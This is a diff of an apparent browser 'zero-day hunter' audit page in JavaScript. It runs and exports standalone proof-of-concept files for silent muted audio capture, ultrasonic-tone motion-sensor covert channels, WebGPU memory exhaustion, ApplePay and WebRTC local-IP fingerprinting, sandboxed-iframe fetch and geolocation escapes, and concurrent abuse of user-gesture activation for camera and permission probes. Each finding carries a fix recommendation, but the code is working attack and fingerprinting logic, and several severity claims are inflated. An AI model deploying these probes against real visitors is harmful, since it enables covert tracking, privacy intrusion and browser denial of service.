+  } catch(e) { log('WRN', `Chain 3 err: ${e.message}`); }
+}
+
+
+/* ========================================================================
+   0-CLICK ARCHITECTURAL PROBES (RUN AFTER GESTURE EXPIRES)
+   ======================================================================== */
+
+async function chain4_10sAudioWorkletExfil() {
+  const cat = 'Hardware API Surface';
+  log('EXP', '<k>CHAIN 4:</k> 10-Second High-Fidelity AudioWorklet Exfiltration');
+  try {
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    const ctx = new AC();
+    if (ctx.state === 'suspended') await ctx.resume(); // Resume silently if allowed
+
+    // AudioWorklet guarantees execution on the audio thread, bypassing DOM throttling
+    const workletCode = `
+      class RecorderProcessor extends AudioWorkletProcessor {
+        process(inputs) {
+          const input = inputs[0];
+          if (input.length > 0) {
+            const channelData = input[0];
+            this.port.postMessage(new Float32Array(channelData));
+          }
+          return true;
+        }
+      }
+      registerProcessor('recorder-worklet', RecorderProcessor);
+    `;
+    const workletBlob = new Blob([workletCode], {type: 'application/javascript'});
+    const workletUrl = URL.createObjectURL(workletBlob);
+    await ctx.audioWorklet.addModule(workletUrl);
+
+    const osc = ctx.createOscillator();
+    osc.type = 'sine'; osc.frequency.setValueAtTime(440, 0);
+    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.1, 0);
+    
+    const node = new AudioWorkletNode(ctx, 'recorder-worklet');
+    const pcmData = [];
+    node.port.onmessage = (e) => pcmData.push(e.data);
+
+    const muteGain = ctx.createGain(); muteGain.gain.setValueAtTime(0.0, 0); // Mute output
+    
+    osc.connect(gain); gain.connect(node); node.connect(muteGain); muteGain.connect(ctx.destination);
+    
+    osc.start();
+    log('INF', '<k>AUDIO WORKLET:</k> Capturing 10 seconds of raw 440Hz PCM on audio thread...');
+    await delay(10000); // True 10 seconds
+    osc.stop(); node.disconnect(); muteGain.disconnect();
+    
+    // Flatten array of Float32Arrays
+    let totalLength = pcmData.reduce((acc, arr) => acc + arr.length, 0);
+    const flatData = new Float32Array(totalLength);
+    let offset = 0;
+    for (const arr of pcmData) { flatData.set(arr, offset); offset += arr.length; }
+
+    const wavBlob = encodeWAV(flatData, ctx.sampleRate);
+    const proofUrl = URL.createObjectURL(wavBlob);
+    
+    addFinding(cat, '10s AudioWorklet Silent Exfil', 'HIGH', 'Intercepted raw 440Hz PCM via AudioWorklet, output muted. Flawless 10s WAV artifact generated.', {duration_sec: 10, sample_rate: ctx.sampleRate, frames_captured: flatData.length}, 8.0, proofUrl, '10s-worklet-audio-pipeline.wav');
+    addVuln('AudioWorklet Background Pipeline Persistence (10s Raw PCM)', 'HIGH',
+      'A WebAudio Oscillator was routed through an AudioWorkletNode and silently muted. The raw PCM data was captured for 10 continuous seconds and encoded into a flawless WAV file. Because AudioWorklets run on a dedicated audio thread, they are immune to DOM background throttling. This proves the browser allows long-term, high-fidelity background audio processing without user interaction.',
+      'Require explicit user gesture for AudioContext processing. Disconnect AudioWorkletNode ports when context is not actively audible to user.');
+    await ctx.close();
+  } catch(e) { log('WRN', `Chain 4 err: ${e.message}`); }
+}
+
+async function chain5_Mobile9DOFSensorOrchestration() {
   const cat = 'Cross-Domain Covert Channels';
-  log('EXP', '<k>CHAIN 3:</k> 20kHz Square Wave Ultrasonic Sensor Fusion');
+  log('EXP', '<k>CHAIN 5:</k> Mobile 9-DOF Sensor Orchestration & 20kHz Coupling');
   try {
     const AC = window.AudioContext || window.webkitAudioContext;
     if (!AC) return;
     const ctx = new AC();
     
-    // FIX: 20kHz Square Wave at 0.2 gain. 
-    // Square waves contain massive harmonic resonance that couples better with MEMS IMUs.
-    // 20kHz is inaudible, and 0.2 gain prevents DAC clipping/aliasing that caused audible noise at 19kHz.
     const osc = ctx.createOscillator();
-    osc.type = 'square'; osc.frequency.setValueAtTime(20000, 0);
+    osc.type = 'square'; osc.frequency.setValueAtTime(20000, 0); // 20kHz square wave
     const gain = ctx.createGain(); gain.gain.setValueAtTime(0.2, 0);
     osc.connect(gain); gain.connect(ctx.destination);
     
-    let sensorData = "timestamp,x,y,z\n";
-    let sensorActive = false;
-    let sensor = null;
-    try {
-      sensor = new Accelerometer({frequency: 60});
-      sensor.addEventListener('reading', () => {
-        sensorData += `${Date.now()},${sensor.x.toFixed(5)},${sensor.y.toFixed(5)},${sensor.z.toFixed(5)}\n`;
-      });
-      sensor.start();
-      sensorActive = true;
-    } catch(e) { log('WRN', `Sensor error: ${e.message}`); }
-    
+    // Try ALL sensors for mobile 9-DOF orchestration
+    const sensors = [];
+    const sensorDefs = [
+      {name: 'Accel', cls: Accelerometer},
+      {name: 'Gyro', cls: Gyroscope},
+      {name: 'Mag', cls: Magnetometer},
+      {name: 'LinAccel', cls: LinearAccelerationSensor},
+      {name: 'AbsOrient', cls: AbsoluteOrientationSensor},
+      {name: 'RelOrient', cls: RelativeOrientationSensor}
+    ];
+
+    let csvData = "timestamp,sys_time";
+    const activeSensors = [];
+
+    for (const def of sensorDefs) {
+      try {
+        const s = new def.cls({frequency: 60});
+        csvData += `,${def.name}_x,${def.name}_y,${def.name}_z,${def.name}_q0,${def.name}_q1,${def.name}_q2,${def.name}_q3`;
+        s.addEventListener('reading', () => {
+          let row = `\n${Date.now()},${performance.now().toFixed(2)}`;
+          for (const ss of activeSensors) {
+            if (ss.s === s) {
+              row += `,${s.x || 0},${s.y || 0},${s.z || 0}`;
+              if (s.quaternion) row += `,${s.quaternion[0]},${s.quaternion[1]},${s.quaternion[2]},${s.quaternion[3]}`;
+              else row += `,0,0,0,0`;
+              break;
+            } else {
+              row += `,0,0,0,0,0,0,0,0`;
+            }
+          }
+          csvData += row;
+        });
+        s.start();
+        activeSensors.push({name: def.name, s});
+        sensors.push(s);
+      } catch(e) {}
+    }
+
     osc.start();
-    log('INF', '<k>COVERT CHANNEL:</k> Playing 20kHz square wave + reading IMU for 5 seconds...');
+    log('INF', `<k>9-DOF COUPLING:</k> Playing 20kHz + reading ${activeSensors.length} sensors for 5 seconds...`);
     await delay(5000);
-    osc.stop(); if(sensor) sensor.stop();
+    osc.stop(); sensors.forEach(s => s.stop());
     await ctx.close();
     
-    const proofUrl = createProofBlob(sensorData, 'text/csv');
-    const standaloneJs = `const ctx = new AudioContext(); const o = ctx.createOscillator(); o.type='square'; o.frequency.value=20000; const g = ctx.createGain(); g.gain.value=0.2; o.connect(g); g.connect(ctx.destination); o.start(); let s = new Accelerometer({frequency:60}); let d=[]; s.addEventListener('reading', ()=>d.push(Date.now()+","+s.x+","+s.y+","+s.z)); s.start(); setTimeout(()=>{o.stop(); s.stop(); console.log("IMU Data captured:", d.length, "frames. Check for 20kHz square wave resonance.");}, 5000);`;
-    const altUrl = createStandaloneHtmlPoC('20kHz Square Wave Sensor Fusion PoC', standaloneJs);
+    const proofUrl = createProofBlob(csvData, 'text/csv');
+    const standaloneJs = `const ctx=new AudioContext();const o=ctx.createOscillator();o.type='square';o.frequency.value=20000;o.connect(ctx.destination);o.start();let s=[];try{s.push(new Accelerometer({frequency:60}))}catch(e){}try{s.push(new Gyroscope({frequency:60}))}catch(e){}s.forEach(x=>{x.onreading=()=>console.log(x.x,x.y,x.z);x.start()});setTimeout(()=>{o.stop();s.forEach(x=>x.stop())},5000);`;
+    const altUrl = createStandaloneHtmlPoC('9-DOF Sensor Orchestration PoC', standaloneJs);
     
-    addFinding(cat, 'Ultrasonic Square Wave IMU Acoustic Resonance', 'CRITICAL', 'Played 20kHz square wave while reading Accelerometer. CSV artifact generated.', {sensor_active: sensorActive}, 15.0, proofUrl, 'ultrasonic-square-imu-fusion.csv', altUrl, 'ultrasonic-square-fusion-poc.html');
-    addVuln('Cross-Domain Ultrasonic Covert Channel (Square Wave)', 'CRITICAL',
-      'The browser allowed simultaneous playback of a 20kHz ultrasonic square wave and high-frequency sampling of the Accelerometer. On devices where speakers couple mechanically to the chassis (e.g., MacBooks), the IMU picks up the harmonic resonance. This allows cross-domain data exfiltration (audio -> motion) bypassing all network boundaries.',
-      'Gate motion sensors strictly behind user permission. Throttle sensor frequency when high-frequency audio is active. Implement acoustic dampning checks in OS.');
-  } catch(e) { log('WRN', `Chain 3 err: ${e.message}`); }
+    addFinding(cat, '9-DOF Ultrasonic Sensor Orchestration', 'CRITICAL', `Orchestrated ${activeSensors.length} mobile sensors (Accel/Gyro/Mag/Orient) alongside 20kHz tone. CSV artifact generated.`, {active_sensors: activeSensors.map(s => s.name)}, 18.0, proofUrl, '9dof-ultrasonic-fusion.csv', altUrl, '9dof-fusion-poc.html');
+    addVuln('Cross-Domain 9-DOF Covert Channel (Mobile)', 'CRITICAL',
+      `The browser allowed simultaneous playback of a 20kHz ultrasonic tone and high-frequency sampling of ${activeSensors.length} motion/orientation sensors. On mobile devices (iPhone), speakers couple mechanically to the chassis. The IMU picks up the harmonic resonance. This allows cross-domain data exfiltration (audio -> motion) bypassing all network boundaries and microphone permissions.`,
+      'Gate all motion sensors strictly behind explicit user permission. Throttle sensor frequency when high-frequency audio is active. Implement acoustic dampning checks in OS.');
+  } catch(e) { log('WRN', `Chain 5 err: ${e.message}`); }
 }
 
-async function chain4_WebGPUMemBoundary() {
+async function chain6_WebGPUMemBoundary() {
   const cat = 'Micro-architectural Side Channels';
-  log('EXP', '<k>CHAIN 4:</k> WebGPU Memory Exhaustion Boundary');
+  log('EXP', '<k>CHAIN 6:</k> WebGPU Memory Exhaustion Boundary');
   try {
     if (!navigator.gpu) return;
     const adapter = await navigator.gpu.requestAdapter();
@@ -509,49 +560,30 @@ async function chain4_WebGPUMemBoundary() {
     let buffers = []; let gracefulLoss = false;
     device.lost.then(info => { gracefulLoss = true; });
     try {
-      // FIX: Cap at 8 buffers (2GB). Enough to trigger OOM gracefully on most GPUs without freezing the OS UI.
       for(let i=0; i<8; i++) { buffers.push(device.createBuffer({ size: 256 * 1024 * 1024, usage: GPUBufferUsage.STORAGE })); }
     } catch(e) { gracefulLoss = true; }
     buffers.forEach(b => b.destroy());
     
     addFinding(cat, 'WebGPU OOM Boundary Probed', 'HIGH', 'Pushed GPU memory to 2GB OOM limit. Check standalone PoC to verify renderer crash.', {buffers_allocated: buffers.length}, 9.0, createProofBlob(JSON.stringify({graceful: gracefulLoss, buffers: buffers.length}, null, 2), 'application/json'), 'gpu-oom.json', altUrl, 'gpu-oom-poc.html');
     addVuln('WebGPU Memory Exhaustion Boundary', 'HIGH', 'If standalone PoC crashes tab instead of firing device.lost, it is a hard DoS.', 'Implement strict per-origin GPU memory quotas.');
-  } catch(e) { log('WRN', `Chain 4 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 6 err: ${e.message}`); }
 }
 
-async function chain5_ApplePay0Click() {
+async function chain7_ApplePay0Click() {
   const cat = 'Vendor Logic Bypasses';
-  log('EXP', '<k>CHAIN 5:</k> ApplePay Permission State Inference');
+  log('EXP', '<k>CHAIN 7:</k> ApplePay Permission State Inference');
   try {
     if (!window.ApplePaySession) return;
     const canPay = ApplePaySession.canMakePayments();
     const standaloneJs = `if(window.ApplePaySession) console.log("Has Cards:", ApplePaySession.canMakePayments());`;
     addFinding(cat, 'ApplePay 0-Click State', 'CRITICAL', 'Inferred Apple Wallet state passively.', {hasCards: canPay}, 12.5, createProofBlob(JSON.stringify({has_cards: canPay}, null, 2), 'application/json'), 'applepay.json', createStandaloneHtmlPoC('ApplePay PoC', standaloneJs), 'applepay-poc.html');
     addVuln('ApplePay Passive Fingerprinting', 'CRITICAL', `canMakePayments() returned ${canPay}.`, 'Gate behind user gesture.');
-  } catch(e) { log('WRN', `Chain 5 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 7 err: ${e.message}`); }
 }
 
-async function chain6_SandboxNetExfil() {
-  const cat = 'Cascading Architecture Failures';
-  log('EXP', '<k>CHAIN 6:</k> Sandbox Network Exfiltration Boundary');
-  try {
-    const iframe = document.createElement('iframe');
-    iframe.sandbox = 'allow-scripts'; iframe.style.display = 'none';
-    iframe.srcdoc = `<script>fetch('https://httpbin.org/get?from=sandbox').then(r=>r.json()).then(d=>parent.postMessage({type:'net_leak',data:d.url},'*')).catch(e=>parent.postMessage({type:'net_err',data:e.message},'*'));<\/script>`;
-    document.body.appendChild(iframe);
-    const result = await new Promise(res => { window.addEventListener('message', e => { if (e.data.type && e.data.type.includes('net_')) res(e.data); }); setTimeout(() => res({type: 'timeout'}), 3000); });
-    document.body.removeChild(iframe);
-    if (result.type === 'net_leak') {
-      const standaloneJs = `const i=document.createElement('iframe');i.sandbox='allow-scripts';i.srcdoc='<script>fetch("https://httpbin.org/get").then(r=>console.log("Sandbox fetch succeeded"))<\\/script>';document.body.appendChild(i);`;
-      addFinding(cat, 'Sandbox Network Exfiltration', 'HIGH', 'Sandboxed iframe executed cross-origin fetch.', result.data, 10.0, createProofBlob(`Sandbox fetch ok: ${result.data}`, 'text/plain'), 'sandbox-net.txt', createStandaloneHtmlPoC('Sandbox Net PoC', standaloneJs), 'sandbox-net-poc.html');
-      addVuln('Sandbox Iframe Network Boundary Bypass', 'HIGH', 'Sandboxed iframe (allow-scripts only) executed fetch to external domain.', 'Enforce network isolation for opaque origins.');
-    }
-  } catch(e) { log('WRN', `Chain 6 err: ${e.message}`); }
-}
-
-async function chain7_JITTypeConfusionLeakCapture() {
+async function chain8_JITTypeConfusionLeakCapture() {
   const cat = 'Memory Boundary Crashes';
-  log('EXP', '<k>CHAIN 7:</k> JIT Prototype Pollution Type Confusion & Leak Capture');
+  log('EXP', '<k>CHAIN 8:</k> JIT Prototype Pollution Type Confusion & Leak Capture');
   try {
     const standaloneJs = `
 function hot(obj) { return obj.x; }
@@ -577,8 +609,6 @@ try {
     let typeConfused = false;
     try {
       leakValue = hot({});
-      // If the JIT correctly deoptimized, it reads the integer from the prototype.
-      // If it type-confused, it interprets the integer bits as a double pointer, returning a weird float.
       if (leakValue !== 1094795585 && typeof leakValue === 'number') {
         typeConfused = true;
       }
@@ -596,57 +626,58 @@ try {
         'The audit forced a monomorphic JIT function expecting Doubles to read an Integer via Object.prototype pollution. The JIT survived, but check the standalone PoC to verify if it crashes the renderer under different memory states.',
         'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops.');
     }
-  } catch(e) { log('WRN', `Chain 7 err: ${e.message}`); }
-}
-
-async function chain8_TransientActivationAutoGrant() {
-  const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 8:</k> Transient Activation Auto-Grant Timing Attack');
-  try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    let firstStream;
-    try {
-      firstStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      firstStream.getTracks().forEach(t => t.stop());
-    } catch(e) { log('INF', '<k>CHAIN 8:</k> GUM denied, cannot test race.'); return; }
-
-    log('INF', '<k>WAITING:</k> 6s for transient activation to expire...');
-    await delay(6000);
-    
-    const t1 = performance.now();
-    const secondCallPromise = navigator.mediaDevices.getUserMedia({ audio: true });
-    const result = await Promise.race([
-      secondCallPromise.then(s => { s.getTracks().forEach(t=>t.stop()); return 'resolved'; }),
-      delay(200).then(() => 'timeout'),
-      secondCallPromise.catch(e => `error:${e.name}`)
-    ]);
-    const dt = performance.now() - t1;
-
-    if (result === 'resolved' && dt < 200) {
-      const standaloneJs = `document.body.onclick=async()=>{let s1=await navigator.mediaDevices.getUserMedia({audio:true});s1.getTracks().forEach(t=>t.stop());console.log("First access ok. Wait 6s...");setTimeout(async()=>{let t0=performance.now();let s2=await navigator.mediaDevices.getUserMedia({audio:true});let dt=performance.now()-t0;console.log("2nd access in",dt,"ms");if(dt<200)console.log("BYPASS DETECTED");s2.getTracks().forEach(t=>t.stop());},6000);};`;
-      addFinding(cat, 'Transient Activation Auto-Grant', 'CRITICAL', `getUserMedia auto-granted in ${dt.toFixed(0)}ms without gesture.`, {dt: dt.toFixed(0)}, 15.0, createProofBlob(`2nd GUM dt: ${dt.toFixed(0)}ms`, 'text/plain'), 'transient-bypass.txt', createStandaloneHtmlPoC('Transient Bypass PoC', standaloneJs), 'transient-poc.html');
-      addVuln('Transient Activation Expiration Bypass', 'CRITICAL', 'Second GUM call auto-granted <200ms after activation expired.', 'Strictly enforce transient activation for EVERY getUserMedia call.');
-    } else {
-      log('OK', `<k>CHAIN 8:</k> Properly gated (${result}, ${dt.toFixed(0)}ms).`);
-    }
   } catch(e) { log('WRN', `Chain 8 err: ${e.message}`); }
 }
 
-async function chain9_SandboxGeoEscape() {
-  const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 9:</k> Permissions Policy Sandbox Escape');
+async function chain9_SandboxEscapes() {
+  const cat = 'Cascading Architecture Failures';
+  log('EXP', '<k>CHAIN 9:</k> Sandbox Network & Geo Escape Probes');
   try {
+    // Network Escape
     const iframe = document.createElement('iframe');
-    iframe.sandbox = 'allow-scripts'; iframe.allow = ''; iframe.style.display = 'none';
-    iframe.srcdoc = `<script>navigator.geolocation.getCurrentPosition(p=>parent.postMessage({type:'geo_leak',data:p.coords},'*'),e=>parent.postMessage({type:'geo_err',data:e.message},'*'));<\/script>`;
+    iframe.sandbox = 'allow-scripts'; iframe.style.display = 'none';
+    iframe.srcdoc = `<script>fetch('https://httpbin.org/get?from=sandbox').then(r=>r.json()).then(d=>parent.postMessage({type:'net_leak',data:d.url},'*')).catch(e=>parent.postMessage({type:'net_err',data:e.message},'*'));<\/script>`;
     document.body.appendChild(iframe);
-    const result = await new Promise(res => { let r=false; window.addEventListener('message', e => { if (e.data.type && e.data.type.includes('geo_') && !r) { r=true; res(e.data); } }); setTimeout(() => res({type: 'timeout'}), 2500); });
+    const result = await new Promise(res => { window.addEventListener('message', e => { if (e.data.type && e.data.type.includes('net_')) res(e.data); }); setTimeout(() => res({type: 'timeout'}), 3000); });
     document.body.removeChild(iframe);
-    if (result.type === 'geo_leak') {
-      addFinding(cat, 'Sandbox Geolocation Bypass', 'CRITICAL', 'Iframe with allow="" accessed Geolocation.', result.data, 10.0);
+    if (result.type === 'net_leak') {
+      const standaloneJs = `const i=document.createElement('iframe');i.sandbox='allow-scripts';i.srcdoc='<script>fetch("https://httpbin.org/get").then(r=>console.log("Sandbox fetch succeeded"))<\\/script>';document.body.appendChild(i);`;
+      addFinding(cat, 'Sandbox Network Exfiltration', 'HIGH', 'Sandboxed iframe executed cross-origin fetch.', result.data, 10.0, createProofBlob(`Sandbox fetch ok: ${result.data}`, 'text/plain'), 'sandbox-net.txt', createStandaloneHtmlPoC('Sandbox Net PoC', standaloneJs), 'sandbox-net-poc.html');
+      addVuln('Sandbox Iframe Network Boundary Bypass', 'HIGH', 'Sandboxed iframe (allow-scripts only) executed fetch to external domain.', 'Enforce network isolation for opaque origins.');
+    }
+
+    // Geo Escape
+    const iframe2 = document.createElement('iframe');
+    iframe2.sandbox = 'allow-scripts'; iframe2.allow = ''; iframe2.style.display = 'none';
+    iframe2.srcdoc = `<script>navigator.geolocation.getCurrentPosition(p=>parent.postMessage({type:'geo_leak',data:p.coords},'*'),e=>parent.postMessage({type:'geo_err',data:e.message},'*'));<\/script>`;
+    document.body.appendChild(iframe2);
+    const result2 = await new Promise(res => { let r=false; window.addEventListener('message', e => { if (e.data.type && e.data.type.includes('geo_') && !r) { r=true; res(e.data); } }); setTimeout(() => res({type: 'timeout'}), 2500); });
+    document.body.removeChild(iframe2);
+    if (result2.type === 'geo_leak') {
+      addFinding(cat, 'Sandbox Geolocation Bypass', 'CRITICAL', 'Iframe with allow="" accessed Geolocation.', result2.data, 10.0);
       addVuln('Permissions Policy Geolocation Sandbox Escape', 'CRITICAL', 'Sandboxed iframe accessed Geolocation.', 'Enforce Permissions Policy in sandboxed iframes.');
     }
   } catch(e) { log('WRN', `Chain 9 err: ${e.message}`); }
+}
+
+async function chain10_WebRTCStatsBypass() {
+  const cat = 'Permission Bypass Chains';
+  log('EXP', '<k>CHAIN 10:</k> WebRTC Stats API mDNS Bypass');
+  try {
+    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('exfil');
+    const candPromise = new Promise(resolve => { let to = setTimeout(resolve, 3000); pc.onicecandidate = e => { if(!e.candidate) { clearTimeout(to); resolve(); return; } }; });
+    const offer = await pc.createOffer(); await pc.setLocalDescription(offer); await candPromise;
+    const stats = await pc.getStats();
+    let leakedLocalIP = null;
+    stats.forEach(r => { if ((r.type === 'local-candidate') && r.address && !r.address.endsWith('.local')) leakedLocalIP = r.address; });
+    try { pc.close(); } catch {}
+    if (leakedLocalIP) {
+      const standaloneJs = `const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)); setTimeout(async () => { let s = await pc.getStats(); s.forEach(r => { if(r.ip) console.log('LEAKED IP:', r.ip); }); }, 3000);`;
+      addFinding(cat, 'WebRTC Stats IP Leak', 'CRITICAL', 'Bypassed mDNS obfuscation.', {local: leakedLocalIP}, 8.0, createProofBlob(JSON.stringify({ip: leakedLocalIP}, null, 2), 'application/json'), 'webrtc-leak.json', createStandaloneHtmlPoC('WebRTC PoC', standaloneJs), 'webrtc-poc.html');
+      addVuln('WebRTC getStats() Bypasses mDNS', 'CRITICAL', `getStats() exposes raw IP. Local=${leakedLocalIP}`, 'Apply mDNS obfuscation to getStats() outputs.');
+    }
+  } catch(e) { log('WRN', `Chain 10 err: ${e.message}`); }
 }
 
 /* ========================================================================
@@ -656,29 +687,43 @@ async function runNuclear(){
   try {
     $('statusBox').classList.remove('armed');
     $('statusBox').classList.add('running');
-    $('statusText').textContent = 'DISCOVERING';
+    $('statusText').textContent = 'HARVESTING GESTURE';
     $('nukeBtn').disabled = true;
 
-    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v10 INITIATED ===</v>');
+    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v11 INITIATED ===</v>');
     log('INF', `Target UA: <v>${navigator.userAgent}</v>`);
     
-    const chains = [
-      ['WebRTC Stats Bypass', chain1_WebRTCStatsBypass],
-      ['10s Raw PCM Audio', chain2_10sRawPCMSilentWavExfil],
-      ['20kHz Square Wave IMU', chain3_UltrasonicSquareWaveIMUFusion],
-      ['WebGPU 2GB OOM Boundary', chain4_WebGPUMemBoundary],
-      ['ApplePay 0-Click', chain5_ApplePay0Click],
-      ['Sandbox Network Exfil', chain6_SandboxNetExfil],
-      ['JIT Type Confusion Leak', chain7_JITTypeConfusionLeakCapture],
-      ['Sandbox Geo Escape', chain9_SandboxGeoEscape]
+    // PHASE 1: GESTURE HARVEST (Run immediately before transient activation expires)
+    log('EXP', '<k>PHASE 1:</k> Harvesting Transient Activation...');
+    const gestureChains = [
+      ['Transient Mic Race', chain1_TransientActivationMicRace], // Note: This chain has an internal 6s delay
+      ['Camera Hardware Oracle', chain2_CameraHardwareOracle],
+      ['Permission Cascade', chain3_GesturePermissionCascade]
     ];
+    // Fire Oracle and Cascade concurrently to abuse the gesture before it expires
+    await Promise.all([
+      withTimeout(chain2_CameraHardwareOracle(), 3000),
+      withTimeout(chain3_GesturePermissionCascade(), 3000)
+    ]);
+    // Now run the Mic Race which waits 6 seconds internally
+    await withTimeout(chain1_TransientActivationMicRace(), 10000);
 
-    chains.push(['Transient Activation Race', chain8_TransientActivationAutoGrant]);
+    // PHASE 2: 0-CLICK ARCHITECTURAL PROBES
+    log('EXP', '<k>PHASE 2:</k> Executing 0-Click Architectural Probes...');
+    const chains = [
+      ['10s AudioWorklet Exfil', chain4_10sAudioWorkletExfil],
+      ['9-DOF Sensor Orchestration', chain5_Mobile9DOFSensorOrchestration],
+      ['WebGPU 2GB OOM Boundary', chain6_WebGPUMemBoundary],
+      ['ApplePay 0-Click', chain7_ApplePay0Click],
+      ['JIT Type Confusion Leak', chain8_JITTypeConfusionLeakCapture],
+      ['Sandbox Escapes', chain9_SandboxEscapes],
+      ['WebRTC Stats Bypass', chain10_WebRTCStatsBypass]
+    ];
 
     for(const [name, fn] of chains){
       log('EXP', `<k>EXECUTING:</k> <v>${name}</v>`);
       try { 
-        const t = name.includes('10s') || name.includes('IMU') || name.includes('Transient') ? 15000 : 5000;
+        const t = name.includes('10s') || name.includes('9-DOF') ? 15000 : 5000;
         await withTimeout(fn(), t);
       } catch(e) { 
         log('CRT', `<x>chain ${name} crashed internally: ${e.message}</x>`);
@@ -704,7 +749,7 @@ function buildJSON(){
   return JSON.stringify({ meta:{time: new Date().toISOString(), ua: navigator.userAgent}, stats: STATS, findings: FINDINGS, vulnerability_chains: VULNS }, null, 2);
 }
 function buildMD(){
-  let md = `# Universal Browser Zero-Day Hunter Report v10\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
+  let md = `# Universal Browser Zero-Day Hunter Report v11\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
   VULNS.forEach(v => md += `### [${v.severity}] ${v.name}\n${v.detail}\n\n**HERO FIX:** ${v.recommendation}\n\n`);
   md += `\n## Full Findings Matrix\n\n`;
   for(const cat in CAT_MAP){
@@ -732,8 +777,8 @@ $('nukeBtn').onclick = async () => {
   await runNuclear();
 };
 
-$('btnJson').onclick = ()=>download(`hero-audit-v10-${Date.now()}.json`, buildJSON(), 'application/json');
-$('btnMd').onclick = ()=>download(`hero-audit-v10-${Date.now()}.md`, buildMD(), 'text/markdown');
+$('btnJson').onclick = ()=>download(`hero-audit-v11-${Date.now()}.json`, buildJSON(), 'application/json');
+$('btnMd').onclick = ()=>download(`hero-audit-v11-${Date.now()}.md`, buildMD(), 'text/markdown');
 
 </script>
 </body>
